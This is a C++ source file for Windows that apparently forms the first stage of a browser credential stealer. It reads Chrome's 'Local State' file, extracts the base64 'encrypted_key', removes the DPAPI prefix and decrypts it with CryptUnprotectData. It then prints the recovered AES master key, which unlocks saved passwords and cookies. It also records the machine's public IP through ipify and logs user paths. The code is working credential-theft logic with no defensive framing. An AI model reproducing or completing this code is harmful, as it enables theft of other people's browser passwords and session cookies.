//Win + General includes
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <cstdlib>
#include <wincrypt.h>
#include <stdexcept>
#include <sstream>
#include <vector>

//external includes etc.
#include <curl/curl.h>
#include "../ext/base64/base64.h"
#include "../ext/json/json.hpp"
#include "../ext/logger/logger.h"
#include "../ext/aes/aes.hpp"

//using nlohmanns json for easy reading and parsing
using json = nlohmann::json;



// Magic chatGPT callback for curl
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userData) {
    size_t totalSize = size * nmemb;
    userData->append((char*)contents, totalSize);
    return totalSize;
}

// Function to read file with UTF-8 encoding --TY CHAT GPT
std::string read_file_utf8(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary); // Open in binary mode
    if (!file) {
        std::cerr << "Error opening file: " << filepath << std::endl;
        return "";
    }

    // Read file content into a vector of chars
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // Convert the vector of chars to a UTF-8 string
    return std::string(buffer.begin(), buffer.end());
}

//Get current public IP address using curl and ipify.org

std::string get_ip() {
    //setup curl
    CURL* curl = curl_easy_init();
    CURLcode res;
    std::string return_ip;

    //define what to do
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://api.ipify.org/");  // Set the URL
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);   // Set callback function
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &return_ip);         // Pass string to store response

        //perform action (send request)
        res = curl_easy_perform(curl);

        //print errors if any.
        if (res != CURLE_OK) {
            printf("some error occured: %s\n", curl_easy_strerror(res));
        }


        //ALWAYS CLEANUP!
        curl_easy_cleanup(curl);
    }
    else {
        printf("curl no worky. \n");
    }
    //return public IP for later use.
    return return_ip;

}



//define paths etc.
namespace definitions {
    std::string ip = get_ip();
    std::string home = std::getenv("USERPROFILE");
    std::string browser = home + "\\AppData\\Local\\Google\\Chrome\\User Data\\";
    std::string localstate_path(browser + "Local State");
    std::string localstate_content = read_file_utf8(definitions::localstate_path);
    bool blank_password;
    std::string decoded_key_str;
    std::string encoded_key_str;
}


json read_local_state() {
    try
    {
        //Parse as json object
        json localstate_json = json::parse(definitions::localstate_content);
        //check if json is empty (TODO: ADD CHECKS FOR OTHER CORRUPTION)
        if (localstate_json.empty()) {
            logger::log(logger::error, "Could not scan json, as it is empty.");
        }
        return localstate_json;
    }
    catch (const std::exception& e)
    {
        logger::log(logger::error, "%s", e.what());
        //return empty json just in case.
        return json{};
    }
    //return localstate json if everything was fine.

}

void check_json(const json& localstate_json) {
    try
    {
        //check if os_crypt is there.
        if (localstate_json.contains("os_crypt")) {
            logger::log(logger::success, "Found os_crypt!");
            //try to access the os_crypt section
            json osCrypt = localstate_json["os_crypt"];
            //check if OS password is set (if not then theres no decryption needed. (i think)
            if (osCrypt.contains("os_password_blank") && osCrypt["os_password_blank"] == true) {
                definitions::blank_password = true;
                logger::log(logger::info, "NO PASSWORD NEEDED!");
            }
            else
            {
                definitions::blank_password = false;
                logger::log(logger::info, "Password required");
            }

            //grab base64 encoded key for later use in decrypt_key function.
            if (osCrypt.contains("encrypted_key")) {
                try
                {
                    definitions::encoded_key_str = osCrypt["encrypted_key"].get<std::string>();

                }
                catch (const std::exception& e)
                {
                    logger::log(logger::error, "Some error occured while grabbing encoded key: %s", e.what());
                }
            }
        }

        else
        {
            logger::log(logger::error, "failed to find os_crypt in json.");
        }
    }
    catch (const std::exception& e)
    {
        logger::log(logger::error, "Failed to check json!, %s", e.what());
    }
}


//unprotect function by copilot
std::vector<BYTE> unprotectData(const std::string& decoded_key_str) {
    if (decoded_key_str.empty()) {
        throw std::runtime_error("Decoded key string is empty. Cannot proceed with decryption.");
    }

    // Initialize encrypted BLOB
    DATA_BLOB encryptedBlob = { 0 };
    encryptedBlob.pbData = reinterpret_cast<BYTE*>(const_cast<char*>(decoded_key_str.data()));
    encryptedBlob.cbData = static_cast<DWORD>(decoded_key_str.size());

    // Initialize decrypted BLOB
    DATA_BLOB decryptedBlob = { 0 };

    // Attempt DPAPI decryption
    if (!CryptUnprotectData(&encryptedBlob, nullptr, nullptr, nullptr, nullptr, 0, &decryptedBlob)) {
        DWORD error = GetLastError();
        std::stringstream ss;
        ss << "CryptUnprotectData failed with error code: " << error;
        throw std::runtime_error(ss.str());
    }

    // Store decrypted data in a vector
    std::vector<BYTE> unprotectedKey(decryptedBlob.pbData, decryptedBlob.pbData + decryptedBlob.cbData);

    // Free memory allocated for decrypted data
    LocalFree(decryptedBlob.pbData);

    return unprotectedKey;
}

//Decode base64 key from check_json.
std::vector<BYTE> decode_key(const std::string& encoded_key_str) {
    //Decode the base64 key
    definitions::decoded_key_str;
    SimpleCrypt::Base64::Decode(encoded_key_str, definitions::decoded_key_str);
    if (definitions::decoded_key_str.empty()) {
        logger::log(logger::error, "Decoded Base64 empty.");
    }

    //subtract the first 5 bytes to remove the DPAI suffix
    if (definitions::decoded_key_str.size() < 5) {
        logger::log(logger::error, "Decoded key is too short!");
    }
    else
    {
        logger::log(logger::info, "Decoded Key size pre slice: %zu", definitions::decoded_key_str.size());
        definitions::decoded_key_str = definitions::decoded_key_str.substr(5);
        logger::log(logger::info, "Decoded Key: %s", definitions::decoded_key_str.c_str());
        logger::log(logger::info, "Decoded Key size post slice: %zu", definitions::decoded_key_str.size());

        //returun unprotected AES key (data)
        return unprotectData(definitions::decoded_key_str);
    }
    return {}; //return empty of smth happened
}

void log_info() {
    logger::log(logger::info, "IP: %s ", definitions::ip.c_str());
    logger::log(logger::info, "home directory: %s ", definitions::home.c_str());
    logger::log(logger::info, "browser directory: %s ", definitions::browser.c_str());
    logger::log(logger::info, "local state file: %s ", definitions::localstate_path.c_str());
}
// Function to print bytes as hexadecimal
void print_hex(const std::vector<BYTE>& data) {
    for (size_t i = 0; i < data.size(); i++) {
        std::cout << std::setw(2) << std::setfill('0') << std::hex << (int)data[i];
    }
    std::cout << std::endl;
}

int main() {

    get_ip();
    json localstate_json = read_local_state();
    check_json(localstate_json);

    try {
        //decode base64 key and remove dpapi prefix. then decrypt it
        //use AES key to later decrypt further.
        std::vector<BYTE> aeskey = decode_key(definitions::encoded_key_str);
        print_hex(aeskey);
    }
    catch (const std::exception& e) {
        logger::log(logger::error, "Error occurred while decoding/unprotecting key: %s", e.what());
    }



    log_info();
    std::cin.get();
	return 0;
}

